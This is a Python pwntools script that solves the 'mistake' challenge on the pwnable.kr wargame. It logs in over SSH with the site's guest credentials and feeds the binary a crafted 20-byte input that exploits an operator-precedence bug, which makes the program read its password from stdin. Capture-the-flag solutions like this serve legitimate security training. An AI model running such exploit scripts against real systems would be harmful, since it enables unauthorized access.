from pwn import *

# mistake
host = 'pwnable.kr'
user = 'mistake'
password = 'guest'
port = 2222

# Notes
#   * This one is pretty cute :)
#   * Because of an operator priority bug, line 17 of the code sets `fd` to
#     `open() < 0` which is false, so `fd` is set to 0 (stdin)
#   * So, instead of reading from `./password`, the binary reads 10 bytes from
#     stdin. These 10 bytes are compared against the normal 10 bytes also read
#     from stdin (after a simple xor)
#   * Send 10 bytes of B's, and then send 10 bytes of B ^ 1 = C to win

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process('./mistake')
  p.send("B" * 10 + "C" * 10)
  print p.recvall()

if __name__ == '__main__':
  attack()
